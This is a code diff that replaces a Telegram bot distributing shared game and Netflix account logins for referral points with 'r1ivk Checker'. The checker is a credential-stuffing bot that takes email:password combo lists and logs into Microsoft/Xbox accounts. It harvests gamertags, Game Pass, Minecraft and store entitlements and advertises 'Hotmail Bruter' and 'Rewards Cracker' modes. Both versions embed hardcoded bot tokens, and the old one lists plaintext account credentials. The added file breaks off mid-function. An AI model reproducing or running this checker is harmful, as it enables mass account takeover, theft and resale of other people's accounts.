@@ -1,748 +1,529 @@
-import asyncio
-import logging
-import sqlite3
-from aiogram import Bot, Dispatcher, F, types
-from aiogram.filters import CommandStart
-from aiogram.types import InlineKeyboardButton
-from aiogram.utils.keyboard import InlineKeyboardBuilder
+# -*- coding: utf-8 -*-
+"""
+r1ivk Checker ⚡ - Pro Inline Menu & Multi-Mode Bot
+"""
 
-# --- توكن البوت الخاص بك ---
-API_TOKEN = "8948074959:AAGIqYYLk0UeD7KUmWbRKqgdYs1n44dRjmo"
+import os
+import re
+import time
+import requests
+import threading
+from urllib.parse import urlparse, parse_qs
+import urllib3
 
-logging.basicConfig(level=logging.INFO)
-bot = Bot(token=API_TOKEN)
-dp = Dispatcher()
+urllib3.disable_warnings()
 
+# =================== Configuration ===================
+TELEGRAM_BOT_TOKEN = "8896382526:AAFMror2dFQ1U0r6RRHrrya2PKuyuoTRtnw"
+OWNER_USERNAME = "r1ivk"
+DAILY_LIMIT = 10000
 
-# --- قاعدة البيانات ---
-def init_db():
-  conn = sqlite3.connect("store_bot.db")
-  cursor = conn.cursor()
+active_scans = {}
+user_usage = {}
+user_selected_mode = {}
+# =====================================================
 
-  # جدول المستخدمين
-  cursor.execute("""
-        CREATE TABLE IF NOT EXISTS users (
-            user_id INTEGER PRIMARY KEY,
-            points INTEGER DEFAULT 0,
-            referred_by INTEGER,
-            lang TEXT DEFAULT 'ar'
+def get_today_date():
+    return time.strftime("%Y-%m-%d")
+
+def check_user_limit(user_id, username, total_lines):
+    if username and username.lower() == OWNER_USERNAME.lower():
+        return True, "Owner bypass active."
+    
+    today = get_today_date()
+    if user_id not in user_usage or user_usage[user_id]["date"] != today:
+        user_usage[user_id] = {"date": today, "count": 0}
+        
+    current_used = user_usage[user_id]["count"]
+    if current_used + total_lines > DAILY_LIMIT:
+        remaining = max(0, DAILY_LIMIT - current_used)
+        return False, f"⚠️ Daily limit reached! You have {remaining}/{DAILY_LIMIT} lines remaining today.\n\nTo upgrade your plan or get unlimited access, contact the owner: @{OWNER_USERNAME}"
+    
+    return True, ""
+
+def update_user_usage(user_id, count):
+    today = get_today_date()
+    if user_id in user_usage and user_usage[user_id]["date"] == today:
+        user_usage[user_id]["count"] += count
+
+def extract_ppft(text):
+    patterns = [
+        r'name="PPFT"[^>]*value="([^"]+)"',
+        r'value="([^"]+)"[^>]*name="PPFT"',
+        r'"PPFT":"([^"]+)"',
+    ]
+    for pattern in patterns:
+        match = re.search(pattern, text, re.IGNORECASE)
+        if match:
+            return match.group(1).replace('\\/', '/').replace('\\"', '"')
+    return None
+
+def extract_url_post(text):
+    patterns = [
+        r'"urlPost":"([^"]+)"',
+        r"urlPost:'([^']+)'",
+        r'id="fmHF"\s+action="([^"]+)"',
+    ]
+    for pattern in patterns:
+        match = re.search(pattern, text, re.IGNORECASE)
+        if match:
+            return match.group(1).replace('\\/', '/')
+    return None
+
+def check_single_account(combo):
+    parts = combo.split(':')
+    if len(parts) < 2:
+        return "invalid"
+
+    email = parts[0].strip()
+    password = ':'.join(parts[1:]).strip()
+
+    session = requests.Session()
+    session.verify = False
+
+    try:
+        sftag_url = (
+            "https://login.live.com/oauth20_authorize.srf"
+            "?client_id=00000000402B5328"
+            "&redirect_uri=https://login.live.com/oauth20_desktop.srf"
+            "&scope=service::user.auth.xboxlive.com::MBI_SSL"
+            "&display=touch"
+            "&response_type=token"
+            "&locale=en"
         )
-    """)
-
-  # جدول الحسابات (اليوزر والباسورد منفصلين لسهولة النسخ)
-  cursor.execute("""
-        CREATE TABLE IF NOT EXISTS accounts (
-            id INTEGER PRIMARY KEY AUTOINCREMENT,
-            username TEXT,
-            password TEXT,
-            category TEXT
-        )
-    """)
-
-  # جدول المشتريات (لحفظ الحسابات التي اشتراها المستخدم للوصول إليها لاحقاً بلا حدود)
-  cursor.execute("""
-        CREATE TABLE IF NOT EXISTS purchases (
-            user_id INTEGER,
-            account_id INTEGER,
-            PRIMARY KEY (user_id, account_id)
-        )
-    """)
-
-  conn.commit()
-  conn.close()
-
-
-init_db()
-
-# --- النصوص والترجمات ---
-texts = {
-    "ar": {
-        "welcome": (
-            "أهلاً بك في متجر r1ivk Store 🎮\nاختر لغتك المفضلة أو استعرض"
-            " الأقسام الجديدة من القائمة أدناه 👇."
-        ),
-        "lang_changed": "تم تغيير اللغة إلى العربية بنجاح! 🇸🇦",
-        "btn_ref": "💎 تجميع رصيد (رابط الدعوة)",
-        "btn_info": "👤 معلومات حسابك",
-        "btn_redeem": "🎁 استبدال النقاط (سحب حساب)",
-        "btn_my_purchases": "📁 حساباتي المشراة",
-        "btn_lang": "🌐 تغيير اللغة / Change Language",
-        "account_info": (
-            "👤 **معلومات حسابك:**\n\n🆔 رقم المستخدم:"
-            " `{}`\n💎 النقاط: `{}` نقطة\n\n🔗 رابط الدعوة الخاص بك (أرسله"
-            " لأصدقائك):\n`{}`\n*(ستحصل على **1 نقطة** مقابل كل شخص يدخل من"
-            " رابطك!)*"
-        ),
-        "redeem_title": (
-            "🎁 **قسم استبدال الحسابات (مرتب وواضح):**\n\nاختر نوع الحساب الذي"
-            " تريد استبداله بنقاطك:"
-        ),
-        "my_purchases_title": (
-            "📁 **حساباتك المشراة (متاحة لك للأبد):**\n\nاضغط على الحساب لعرض"
-            " بياناته متى شئت بدون خصم أي نقاط:"
-        ),
-        "no_purchases": "❌ لم تقم بشراء أي حسابات حتى الآن.",
-        "no_accounts": (
-            "❌ عذراً، لا توجد حسابات متاحة حالياً في هذا القسم. تابع التجميع لحين"
-            " وصول دفعة جديدة!"
-        ),
-        "not_enough_points": (
-            "⚠️ نقاطك غير كافية! يلزمك المزيد من النقاط لفتح هذا الحساب."
-        ),
-        "success_redeem": (
-            "🎉 **مبروك! تم شراء الحساب بنجاح:**\n\n👤 **اسم المستخدم (Username):**"
-            " `{}`\n🔑 **كلمة المرور (Password):**\n`{}`\n\n*(تم حفظ الحساب في"
-            " سجلك للأبد)*"
-        ),
-        "success_reaccess": (
-            "🔓 **إليك بيانات الحساب (مشتري مسبقاً):**\n\n👤 **اسم المستخدم"
-            " (Username):** `{}`\n🔑 **كلمة المرور (Password):**\n`{}`"
-        ),
-        "btn_back": "⬅️ رجوع للقائمة الرئيسية",
-    },
-    "en": {
-        "welcome": (
-            "Welcome to r1ivk Store 🎮\nChoose your preferred language or"
-            " explore the updated game sections below 👇."
-        ),
-        "lang_changed": "Language changed to English successfully! 🇬🇧",
-        "btn_ref": "💎 Earn Points (Ref Link)",
-        "btn_info": "👤 Account Info",
-        "btn_redeem": "🎁 Redeem Points",
-        "btn_my_purchases": "📁 My Purchased Accounts",
-        "btn_lang": "🌐 تغيير اللغة / Change Language",
-        "account_info": (
-            "👤 **Account Info:**\n\n🆔 User ID: `{}`\n💎 Points: `{}`"
-            " pts\n\n🔗 Your Referral Link (Share with friends):\n`{}`\n*(You will"
-            " get **1 point** for every person who joins via your link!)*"
-        ),
-        "redeem_title": (
-            "🎁 **Accounts Redemption Section:**\n\nChoose the account category"
-            " you want to redeem:"
-        ),
-        "my_purchases_title": (
-            "📁 **Your Purchased Accounts (Yours Forever):**\n\nClick on any"
-            " account to view its details anytime for free:"
-        ),
-        "no_purchases": "❌ You haven't purchased any accounts yet.",
-        "no_accounts": (
-            "❌ Sorry, no accounts are currently available in this category."
-            " Keep earning points!"
-        ),
-        "not_enough_points": (
-            "⚠️ Not enough points! You need more points to redeem this account."
-        ),
-        "success_redeem": (
-            "🎉 **Congratulations! Account purchased successfully:**\n\n👤"
-            " **Username:** `{}`\n🔑 **Password:**\n`{}`\n\n*(Saved to your"
-            " profile forever)*"
-        ),
-        "success_reaccess": (
-            "🔓 **Account details (Previously purchased):**\n\n👤"
-            " **Username:** `{}`\n🔑 **Password:**\n`{}`"
-        ),
-        "btn_back": "Main Menu",
-    },
-}
-
-
-def get_lang(user_id):
-  conn = sqlite3.connect("store_bot.db")
-  cursor = conn.cursor()
-  cursor.execute("SELECT lang FROM users WHERE user_id = ?", (user_id,))
-  row = cursor.fetchone()
-  conn.close()
-  return row[0] if row else "ar"
-
-
-def get_main_keyboard(lang):
-  t = texts[lang]
-  builder = InlineKeyboardBuilder()
-  builder.row(
-      InlineKeyboardButton(text=t["btn_ref"], callback_data="earn_points")
-  )
-  builder.row(
-      InlineKeyboardButton(text=t["btn_info"], callback_data="account_info")
-  )
-  builder.row(
-      InlineKeyboardButton(text=t["btn_redeem"], callback_data="redeem_menu")
-  )
-  builder.row(
-      InlineKeyboardButton(
-          text=t["btn_my_purchases"], callback_data="my_purchases"
-      )
-  )
-  builder.row(
-      InlineKeyboardButton(text=t["btn_lang"], callback_data="toggle_lang")
-  )
-  return builder.as_markup()
-
-
-@dp.message(CommandStart())
-async def cmd_start(message: types.Message):
-  user_id = message.from_user.id
-  args = message.text.split()
-
-  conn = sqlite3.connect("store_bot.db")
-  cursor = conn.cursor()
-  cursor.execute("SELECT lang, points FROM users WHERE user_id = ?", (user_id,))
-  user = cursor.fetchone()
-
-  if not user:
-    referred_by = None
-    if len(args) > 1 and args[1].isdigit():
-      ref_id = int(args[1])
-      if ref_id != user_id:
-        cursor.execute(
-            "SELECT user_id FROM users WHERE user_id = ?", (ref_id,)
-        )
-        if cursor.fetchone():
-          referred_by = ref_id
-          cursor.execute(
-              "UPDATE users SET points = points + 1 WHERE user_id = ?", (ref_id,)
-          )
-
-    cursor.execute(
-        "INSERT INTO users (user_id, points, referred_by, lang) VALUES (?, 0,"
-        " ?, 'ar')",
-        (user_id, referred_by),
-    )
-    conn.commit()
-    lang = "ar"
-  else:
-    lang = user[0]
-  conn.close()
-
-  t = texts[lang]
-  await message.answer(t["welcome"], reply_markup=get_main_keyboard(lang))
-
-
-@dp.callback_query(F.data == "toggle_lang")
-async def toggle_lang(callback: types.CallbackQuery):
-  user_id = callback.from_user.id
-  current_lang = get_lang(user_id)
-  new_lang = "en" if current_lang == "ar" else "ar"
-
-  conn = sqlite3.connect("store_bot.db")
-  cursor = conn.cursor()
-  cursor.execute(
-      "UPDATE users SET lang = ? WHERE user_id = ?", (new_lang, user_id)
-  )
-  conn.commit()
-  conn.close()
-
-  t = texts[new_lang]
-  await callback.message.edit_text(
-      t["lang_changed"], reply_markup=get_main_keyboard(new_lang)
-  )
-  await callback.answer()
-
-
-@dp.callback_query(F.data == "account_info")
-async def show_account_info(callback: types.CallbackQuery):
-  user_id = callback.from_user.id
-  lang = get_lang(user_id)
-
-  conn = sqlite3.connect("store_bot.db")
-  cursor = conn.cursor()
-  cursor.execute("SELECT points FROM users WHERE user_id = ?", (user_id,))
-  points = cursor.fetchone()[0]
-  conn.close()
-
-  bot_info = await bot.get_me()
-  ref_link = f"https://t.me/{bot_info.username}?start={user_id}"
-
-  t = texts[lang]
-  text = t["account_info"].format(user_id, points, ref_link)
-
-  builder = InlineKeyboardBuilder()
-  builder.row(
-      InlineKeyboardButton(text=t["btn_back"], callback_data="main_menu")
-  )
-
-  await callback.message.edit_text(
-      text, reply_markup=builder.as_markup(), disable_web_page_preview=True
-  )
-  await callback.answer()
-
-
-@dp.callback_query(F.data == "earn_points")
-async def earn_points_menu(callback: types.CallbackQuery):
-  user_id = callback.from_user.id
-  lang = get_lang(user_id)
-  bot_info = await bot.get_me()
-  ref_link = f"https://t.me/{bot_info.username}?start={user_id}"
-
-  if lang == "ar":
-    text = (
-        "💎 **طريقة تجميع النقاط (دعوة الأصدقاء):**\n\nقم بنسخ رابط الدعوة الخاص"
-        " بك وأرسله لأصدقائك.\nلكل شخص يدخل البوت عبر رابطك الخاص، ستحصل أنت"
-        " على **1 نقطة** فوراً!\n\n🔗 رابطك الخاص:\n`{}`".format(ref_link)
-    )
-  else:
-    text = (
-        "💎 **How to earn points (Invite Friends):**\n\nCopy your referral link"
-        " and share it with friends.\nFor every person who joins via your"
-        " link, you will get **1 point** instantly!\n\n🔗 Your"
-        " link:\n`{}`".format(ref_link)
-    )
-
-  builder = InlineKeyboardBuilder()
-  builder.row(
-      InlineKeyboardButton(
-          text=texts[lang]["btn_back"], callback_data="main_menu"
-      )
-  )
-
-  await callback.message.edit_text(
-      text, reply_markup=builder.as_markup(), disable_web_page_preview=True
-  )
-  await callback.answer()
-
-
-@dp.callback_query(F.data == "redeem_menu")
-async def redeem_menu(callback: types.CallbackQuery):
-  user_id = callback.from_user.id
-  lang = get_lang(user_id)
-  t = texts[lang]
-
-  builder = InlineKeyboardBuilder()
-  builder.row(
-      InlineKeyboardButton(
-          text="🔥 Resident Evil 4 Remake + 30 AAA Games (30 pts)",
-          callback_data="redeem_re4remake",
-      )
-  )
-  builder.row(
-      InlineKeyboardButton(
-          text="🪓 God of War (2018) + Ragnarok (20 pts)",
-          callback_data="redeem_godofwar",
-      )
-  )
-  builder.row(
-      InlineKeyboardButton(
-          text="🤖 Cyberpunk 2077 (20 pts)", callback_data="redeem_cyberpunk"
-      )
-  )
-  builder.row(
-      InlineKeyboardButton(
-          text="🧟 Resident Evil Requiem (15 pts)",
-          callback_data="redeem_requiem",
-      )
-  )
-  builder.row(
-      InlineKeyboardButton(
-          text="🤠 Red Dead Redemption 2 (10 pts)", callback_data="redeem_rdr2"
-      )
-  )
-  builder.row(
-      InlineKeyboardButton(
-          text="⚽ FC 26 / FIFA 26 (10 pts)", callback_data="redeem_fifa26"
-      )
-  )
-  builder.row(
-      InlineKeyboardButton(
-          text="🌿 The Last of Us Part I & II (10 pts)",
-          callback_data="redeem_thelastofus",
-      )
-  )
-  builder.row(
-      InlineKeyboardButton(
-          text="🕷️ Spider-Man Remastered (10 pts)",
-          callback_data="redeem_spiderman1",
-      )
-  )
-  builder.row(
-      InlineKeyboardButton(
-          text="🕷️ Spider-Man: Miles Morales (10 pts)",
-          callback_data="redeem_miles",
-      )
-  )
-  builder.row(
-      InlineKeyboardButton(
-          text="🕷️ Spider-Man 2 (10 pts)", callback_data="redeem_spiderman2"
-      )
-  )
-  builder.row(
-      InlineKeyboardButton(
-          text="🏎️ Forza Horizon 6 (10 pts)", callback_data="redeem_forza"
-      )
-  )
-  builder.row(
-      InlineKeyboardButton(
-          text="🗡️ Ghost of Tsushima (Gold Edition) (10 pts)",
-          callback_data="redeem_tsushima",
-      )
-  )
-  builder.row(
-      InlineKeyboardButton(
-          text="🦇 Batman Arkham Trilogy (10 pts)",
-          callback_data="redeem_batman",
-      )
-  )
-  builder.row(
-      InlineKeyboardButton(
-          text="🌀 Naruto Shippuden: Ultimate Ninja Storm (10 pts)",
-          callback_data="redeem_naruto",
-      )
-  )
-  builder.row(
-      InlineKeyboardButton(
-          text="🐀 A Plague Tale: Innocence (Part 1) (10 pts)",
-          callback_data="redeem_plague1",
-      )
-  )
-  builder.row(
-      InlineKeyboardButton(
-          text="🐀 A Plague Tale: Requiem (Part 2) (10 pts)",
-          callback_data="redeem_plague2",
-      )
-  )
-  builder.row(
-      InlineKeyboardButton(
-          text="🏎️ GTA V Account (8 pts)", callback_data="redeem_gta"
-      )
-  )
-  builder.row(
-      InlineKeyboardButton(
-          text="💻 Watch Dogs (5 pts)", callback_data="redeem_watchdogs"
-      )
-  )
-  builder.row(
-      InlineKeyboardButton(
-          text="🍿 Netflix Account (3 pts)", callback_data="redeem_netflix"
-      )
-  )
-  builder.row(
-      InlineKeyboardButton(
-          text="🎮 حساب ستيم عشوائي (2 pts)", callback_data="redeem_steam"
-      )
-  )
-  builder.row(
-      InlineKeyboardButton(text=t["btn_back"], callback_data="main_menu")
-  )
-
-  await callback.message.edit_text(
-      t["redeem_title"], reply_markup=builder.as_markup()
-  )
-  await callback.answer()
-
-
-@dp.callback_query(F.data == "my_purchases")
-async def my_purchases_menu(callback: types.CallbackQuery):
-  user_id = callback.from_user.id
-  lang = get_lang(user_id)
-  t = texts[lang]
-
-  conn = sqlite3.connect("store_bot.db")
-  cursor = conn.cursor()
-  cursor.execute(
-      """
-        SELECT accounts.id, accounts.category 
-        FROM purchases 
-        JOIN accounts ON purchases.account_id = accounts.id 
-        WHERE purchases.user_id = ?
-    """,
-      (user_id,),
-  )
-  purchased_accounts = cursor.fetchall()
-  conn.close()
-
-  builder = InlineKeyboardBuilder()
-
-  if not purchased_accounts:
-    builder.row(
-        InlineKeyboardButton(text=t["btn_back"], callback_data="main_menu")
-    )
-    await callback.message.edit_text(
-        f"{t['my_purchases_title']}\n\n{t['no_purchases']}",
-        reply_markup=builder.as_markup(),
-    )
-    await callback.answer()
-    return
-
-  for acc_id, category in purchased_accounts:
-    builder.row(
-        InlineKeyboardButton(
-            text=f"📦 حساب: {category}",
-            callback_data=f"show_my_acc_{acc_id}",
-        )
-    )
-
-  builder.row(
-      InlineKeyboardButton(text=t["btn_back"], callback_data="main_menu")
-  )
-  await callback.message.edit_text(
-      t["my_purchases_title"], reply_markup=builder.as_markup()
-  )
-  await callback.answer()
-
-
-@dp.callback_query(F.data.startswith("show_my_acc_"))
-async def show_my_account(callback: types.CallbackQuery):
-  user_id = callback.from_user.id
-  lang = get_lang(user_id)
-  t = texts[lang]
-
-  acc_id = int(callback.data.split("_")[3])
-
-  conn = sqlite3.connect("store_bot.db")
-  cursor = conn.cursor()
-  cursor.execute(
-      """
-        SELECT accounts.username, accounts.password 
-        FROM purchases 
-        JOIN accounts ON purchases.account_id = accounts.id 
-        WHERE purchases.user_id = ? AND purchases.account_id = ?
-    """,
-      (user_id, acc_id),
-  )
-  acc = cursor.fetchone()
-  conn.close()
-
-  builder = InlineKeyboardBuilder()
-  builder.row(
-      InlineKeyboardButton(text=t["btn_back"], callback_data="my_purchases")
-  )
-
-  if not acc:
-    await callback.answer(
-        "❌ عذراً، هذا الحساب غير موجود في سجلك.", show_alert=True
-    )
-    return
-
-  username, password = acc
-  await callback.message.edit_text(
-      t["success_reaccess"].format(username, password),
-      reply_markup=builder.as_markup(),
-  )
-  await callback.answer()
-
-
-@dp.callback_query(F.data.startswith("redeem_"))
-async def process_redeem(callback: types.CallbackQuery):
-  user_id = callback.from_user.id
-  lang = get_lang(user_id)
-  t = texts[lang]
-
-  category = callback.data.split("_", 1)[1]
-
-  if category == "re4remake":
-    cost = 30
-  elif category in ["godofwar", "cyberpunk"]:
-    cost = 20
-  elif category == "requiem":
-    cost = 15
-  elif category in [
-      "rdr2",
-      "fifa26",
-      "thelastofus",
-      "spiderman1",
-      "miles",
-      "spiderman2",
-      "forza",
-      "tsushima",
-      "batman",
-      "naruto",
-      "plague1",
-      "plague2",
-  ]:
-    cost = 10
-  elif category == "gta":
-    cost = 8
-  elif category == "watchdogs":
-    cost = 5
-  elif category == "netflix":
-    cost = 3
-  else:
-    cost = 2
-
-  conn = sqlite3.connect("store_bot.db")
-  cursor = conn.cursor()
-
-  cursor.execute(
-      "SELECT id, username, password FROM accounts WHERE category = ? LIMIT 1",
-      (category,),
-  )
-  acc = cursor.fetchone()
-
-  if not acc:
-    await callback.answer(t["no_accounts"], show_alert=True)
-    conn.close()
-    return
-
-  acc_id, username, password = acc
-
-  cursor.execute(
-      "SELECT 1 FROM purchases WHERE user_id = ? AND account_id = ?",
-      (user_id, acc_id),
-  )
-  already_purchased = cursor.fetchone()
-
-  if already_purchased:
-    conn.close()
-    await callback.message.edit_text(
-        t["success_reaccess"].format(username, password),
-        reply_markup=InlineKeyboardBuilder()
-        .row(InlineKeyboardButton(text=t["btn_back"], callback_data="main_menu"))
-        .as_markup(),
-    )
-    await callback.answer()
-    return
-
-  cursor.execute("SELECT points FROM users WHERE user_id = ?", (user_id,))
-  user_points = cursor.fetchone()[0]
-
-  if user_points < cost:
-    await callback.answer(t["not_enough_points"], show_alert=True)
-    conn.close()
-    return
-
-  cursor.execute(
-      "UPDATE users SET points = points - ? WHERE user_id = ?", (cost, user_id)
-  )
-  cursor.execute(
-      "INSERT OR IGNORE INTO purchases (user_id, account_id) VALUES (?, ?)",
-      (user_id, acc_id),
-  )
-  conn.commit()
-  conn.close()
-
-  await callback.message.edit_text(
-      t["success_redeem"].format(username, password),
-      reply_markup=InlineKeyboardBuilder()
-      .row(InlineKeyboardButton(text=t["btn_back"], callback_data="main_menu"))
-      .as_markup(),
-  )
-  await callback.answer()
-
-
-@dp.callback_query(F.data == "main_menu")
-async def back_to_main(callback: types.CallbackQuery):
-  user_id = callback.from_user.id
-  lang = get_lang(user_id)
-  t = texts[lang]
-  await callback.message.edit_text(
-      t["welcome"], reply_markup=get_main_keyboard(lang)
-  )
-  await callback.answer()
-
-
-async def main():
-  conn = sqlite3.connect("store_bot.db")
-  cursor = conn.cursor()
-
-  accounts_to_add = [
-      (
-          "re4remake",
-          "pinokio542",
-          "EYK2Y99Z2TK5",
-      ),
-      (
-          "godofwar",
-          "seekkeygow2018",
-          "XUgStsAmHGUM",
-      ),
-      (
-          "cyberpunk",
-          "c21282",
-          "asdAVXab21Z",
-      ),
-      (
-          "requiem",
-          "req_user_official_1984",
-          "pass_req_secure_99",
-      ),
-      (
-          "rdr2",
-          "followinghoverfly3787",
-          "f-r-e-e-akk-tg:@hyznet",
-      ),
-      (
-          "fifa26",
-          "svfwqhmr6zrth7rj",
-          "Ivancito2009_",
-      ),
-      (
-          "thelastofus",
-          "thelast1q",
-          "playerok.com/profile/QAVIX",
-      ),
-      (
-          "spiderman1",
-          "sp1_remastered_user",
-          "pass_sp1_2026",
-      ),
-      (
-          "miles",
-          "miles_morales_pc_user",
-          "pass_miles_01",
-      ),
-      (
-          "spiderman2",
-          "sp2_by_heero",
-          "https://t.me/steamaccountsog",
-      ),
-      (
-          "forza",
-          "duhl15773",
-          "Muhammadknio12!",
-      ),
-      (
-          "tsushima",
-          "MythicStore_GOT_01",
-          "https://t.me/Steam_Family",
-      ),
-      (
-          "batman",
-          "batman_arkham_trilogy_user",
-          "pass_arkham_123",
-      ),
-      (
-          "naruto",
-          "naruto_storm_series_pc",
-          "pass_naruto_storm_99",
-      ),
-      (
-          "plague1",
-          "aplaguetale_innocence_pc",
-          "pass_plague_innocence_1",
-      ),
-      (
-          "plague2",
-          "aplaguetale_requiem_pc",
-          "pass_plague_requiem_2",
-      ),
-      (
-          "gta",
-          "hedpy459961",
-          "gta_secure_pass_88",
-      ),
-      (
-          "watchdogs",
-          "jp30ekXr",
-          "wa72ITSA",
-      ),
-      (
-          "netflix",
-          "netflix_premium_acc_01",
-          "pass_net_789",
-      ),
-  ]
-
-  for cat, user_val, pass_val in accounts_to_add:
-    cursor.execute("SELECT COUNT(*) FROM accounts WHERE category = ?", (cat,))
-    if cursor.fetchone()[0] == 0:
-      cursor.execute(
-          "INSERT INTO accounts (username, password, category) VALUES (?, ?,"
-          " ?)",
-          (user_val, pass_val, cat),
-      )
-      conn.commit()
-
-  conn.close()
-  await dp.start_polling(bot)
-
+        resp = session.get(sftag_url, timeout=15)
+        sftag = extract_ppft(resp.text)
+        url_post = extract_url_post(resp.text)
+
+        if not sftag or not url_post:
+            return "bad"
+
+        login_data = {
+            'login': email,
+            'loginfmt': email,
+            'passwd': password,
+            'PPFT': sftag,
+            'type': '11',
+            'NewUser': '1',
+            'LoginOptions': '3',
+            'i19': '0',
+        }
+        headers = {
+            'Content-Type': 'application/x-www-form-urlencoded',
+            'Referer': sftag_url,
+            'Origin': 'https://login.live.com',
+        }
+        login_req = session.post(url_post, data=login_data, headers=headers, allow_redirects=True, timeout=15)
+        login_text = login_req.text.lower()
+
+        ms_token = None
+        if 'access_token' in login_req.url:
+            ms_token = parse_qs(urlparse(login_req.url).fragment).get('access_token', [None])[0]
+        elif 'access_token' in login_text:
+            token_match = re.search(r'access_token=([^&\s\"\']+)', login_text)
+            if token_match:
+                ms_token = token_match.group(1)
+
+        if any(x in login_text for x in ["password is incorrect", "account doesn't exist", "passwords don't match"]):
+            return "bad"
+        elif any(x in login_text for x in ["recover", "locked", "help us protect", "verify your identity", "two-step", "additional security"]):
+            return "twofa"
+
+        if not ms_token:
+            return "bad"
+
+        # Xbox Auth & Details
+        xb_payload = {"Properties": {"AuthMethod": "RPS", "SiteName": "user.auth.xboxlive.com", "RpsTicket": ms_token}, "RelyingParty": "http://auth.xboxlive.com", "TokenType": "JWT"}
+        xb_headers = {'Content-Type': 'application/json', 'Accept': 'application/json'}
+        xb_req = session.post('https://user.auth.xboxlive.com/user/authenticate', json=xb_payload, headers=xb_headers, timeout=15)
+
+        if xb_req.status_code != 200:
+            return "bad"
+
+        xb_token = xb_req.json()['Token']
+        uhs = xb_req.json()['DisplayClaims']['xui'][0]['uhs']
+
+        gamertag = "N/A"
+        gamerscore = "0"
+        gscore_int = 0
+
+        try:
+            xsts_xb_payload = {"Properties": {"SandboxId": "RETAIL", "UserTokens": [xb_token]}, "RelyingParty": "http://xboxlive.com", "TokenType": "JWT"}
+            xsts_xb_req = session.post('https://xsts.auth.xboxlive.com/xsts/authorize', json=xsts_xb_payload, headers=xb_headers, timeout=15)
+            if xsts_xb_req.status_code == 200:
+                xsts_xb_token = xsts_xb_req.json()['Token']
+                prof_req = session.get("https://profile.xboxlive.com/users/me/profile/settings?settings=Gamertag,Gamerscore", 
+                                       headers={"Authorization": f"XBL3.0 x={uhs};{xsts_xb_token}", "x-xbl-contract-version": "2"}, timeout=15)
+                if prof_req.status_code == 200:
+                    settings = prof_req.json().get('profileUsers', [{}])[0].get('settings', [])
+                    for s in settings:
+                        if s['id'] == 'Gamertag': gamertag = s['value']
+                        if s['id'] == 'Gamerscore': 
+                            gamerscore = s['value']
+                            try: gscore_int = int(gamerscore)
+                            except: gscore_int = 0
+        except:
+            pass
+
+        has_gp = False
+        has_mc = False
+        gp_type = "No"
+        mc_ent_text = ""
+        games_list = []
+
+        try:
+            xsts_store_payload = {"Properties": {"SandboxId": "RETAIL", "UserTokens": [xb_token]}, "RelyingParty": "https://purchase.mp.microsoft.com", "TokenType": "JWT"}
+            xsts_store_req = session.post('https://xsts.auth.xboxlive.com/xsts/authorize', json=xsts_store_payload, headers=xb_headers, timeout=15)
+            if xsts_store_req.status_code == 200:
+                xsts_store_token = xsts_store_req.json()['Token']
+                licenses_req = session.get("https://purchase.mp.microsoft.com/v8/users/me/products?itemTypes=Game,Consumable,Durable",
+                                            headers={"Authorization": f"XBL3.0 x={uhs};{xsts_store_token}"}, timeout=15)
+                if licenses_req.status_code == 200:
+                    items = licenses_req.json().get('items', [])
+                    for item in items:
+                        p_id = item.get('productId', '')
+                        if p_id: games_list.append(p_id)
+        except:
+            pass
+
+        try:
+            xsts_mc_payload = {"Properties": {"SandboxId": "RETAIL", "UserTokens": [xb_token]}, "RelyingParty": "rp://api.minecraftservices.com/", "TokenType": "JWT"}
+            xsts_mc_req = session.post('https://xsts.auth.xboxlive.com/xsts/authorize', json=xsts_mc_payload, headers=xb_headers, timeout=15)
+            if xsts_mc_req.status_code == 200:
+                xsts_mc_token = xsts_mc_req.json()['Token']
+                mc_auth = session.post('https://api.minecraftservices.com/authentication/login_with_xbox', 
+                                       json={'identityToken': f"XBL3.0 x={uhs};{xsts_mc_token}"}, 
+                                       headers={'Content-Type': 'application/json'}, timeout=15)
+                if mc_auth.status_code == 200:
+                    mc_token = mc_auth.json().get('access_token')
+                    if mc_token:
+                        ent_req = session.get('https://api.minecraftservices.com/entitlements/mcstore', headers={'Authorization': f'Bearer {mc_token}'}, timeout=15)
+                        if ent_req.status_code == 200:
+                            mc_ent_text = ent_req.text
+        except:
+            pass
+
+        if 'product_game_pass_ultimate' in mc_ent_text or any('gamepass' in g.lower() for g in games_list):
+            gp_type = "Ultimate"
+            has_gp = True
+        elif 'product_game_pass_pc' in mc_ent_text:
+            gp_type = "PC"
+            has_gp = True
+
+        has_mc = 'product_minecraft' in mc_ent_text or any('minecraft' in g.lower() for g in games_list)
+
+        hit_info = f"{email}:{password} | Gamertag: {gamertag} | G-Score: {gamerscore} | MC: {has_mc} | GP: {gp_type} | Items: {len(games_list)}"
+
+        if has_gp or has_mc or gscore_int > 0 or len(games_list) > 0:
+            return {"status": "hit", "mc": has_mc, "gp": has_gp, "live": True, "info": hit_info}
+        else:
+            return {"status": "live", "info": hit_info}
+
+    except Exception:
+        return "error"
+    finally:
+        session.close()
+
+def send_telegram_message(chat_id, text, reply_markup=None):
+    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
+    payload = {"chat_id": chat_id, "text": text, "parse_mode": "Markdown"}
+    if reply_markup:
+        payload["reply_markup"] = reply_markup
+    try:
+        resp = requests.post(url, json=payload, timeout=10).json()
+        if "result" in resp:
+            return resp["result"].get("message_id")
+    except:
+        pass
+    return None
+
+def edit_telegram_message(chat_id, message_id, text, reply_markup=None):
+    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/editMessageText"
+    payload = {"chat_id": chat_id, "message_id": message_id, "text": text, "parse_mode": "Markdown"}
+    if reply_markup:
+        payload["reply_markup"] = reply_markup
+    try:
+        requests.post(url, json=payload, timeout=10)
+    except:
+        pass
+
+def send_telegram_document(chat_id, file_path, caption=""):
+    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendDocument"
+    try:
+        with open(file_path, 'rb') as f:
+            files = {'document': f}
+            data = {'chat_id': chat_id, 'caption': caption, 'parse_mode': 'Markdown'}
+            requests.post(url, data=data, files=files, timeout=30)
+    except:
+        pass
+
+def get_main_menu():
+    return {
+        "inline_keyboard": [
+            [{"text": "🎮 Xbox + Minecraft + GP", "callback_data": "mode_xbox"}],
+            [{"text": "🔥 Hotmail Bruter", "callback_data": "mode_hotmail"}],
+            [{"text": "💎 Rewards Cracker", "callback_data": "mode_rewards"}],
+            [{"text": "⚡ Status / Info", "callback_data": "info_menu"}]
+        ]
+    }
+
+def run_checker_process(chat_id, combos, mode_name):
+    total = len(combos)
+    checked = 0
+    hits = 0
+    mc_count = 0
+    gp_count = 0
+    live_count = 0
+    twofa_count = 0
+    bad_count = 0
